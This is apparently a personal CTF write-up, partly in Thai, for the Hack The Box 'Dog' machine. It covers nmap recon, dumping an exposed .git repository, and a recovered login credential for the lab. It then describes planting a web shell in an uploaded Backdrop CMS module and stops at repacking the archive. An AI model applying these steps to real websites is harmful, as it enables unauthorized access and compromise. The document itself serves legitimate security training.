# Recon

```bash
./scan.sh 10.10.11.58
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 00:30 EDT
Nmap scan report for 10.10.11.58
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds

```

หา Dirb จะพบกับ .git 

![[Challenge/HTB Challenge/Dog/IMG/002.png]]
![[Challenge/HTB Challenge/Dog/IMG/001.png]]

## Git Dump 

```bash
git-dumper http://dog.htb/.git/  ./dog-git
```

จากนั้นทำการค้นหาบัญชีผู้ใช้ภายใต้โดเมนจะเห็นว่ามีชื่อผู้ใช้ชื่อ tiffany@dog.htb 
```bash
grep -r "@dog.htb"
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000       commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000    commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"

```
ตรวจสอบไฟล์ settings.php  จะพบว่ามีรหัสผ่านอยู่ 

![[Challenge/HTB Challenge/Dog/IMG/003.png]]

## Credential FOUND 
```credential
tiffany@dog.htb:BackDropJ2024DS2024
```

ซึ่งหากเรานำข้อมูลดังกล่าวไป Login หน้าเว็บจะสามารถเข้าถึงได้

![[Challenge/HTB Challenge/Dog/IMG/005.png]]

![[Challenge/HTB Challenge/Dog/IMG/004.png]]

ในเว็บเป้าหมายมีเมนูให้เราสามารถ upload modules ได้ โดยผมจะทำการดาวโหลด module มาจากเว็บ  https://backdropcms.org/modules 
![[Challenge/HTB Challenge/Dog/IMG/007.png]]

จากนั้นทำการแก้ไข เพิ่มส่วนของ web shell ลงไป 
![[Challenge/HTB Challenge/Dog/IMG/008.png]]

![[Challenge/HTB Challenge/Dog/IMG/006.png]]

จากนั้นจับทุกอย่างบีบอัดไฟล์เป็น .tar.gz อีกครั้ง 
```bash
tar -czvf front.tar.gz *
```


ทำวิธีตามนี้อยู่
https://www.hyhforever.top/htb-dog/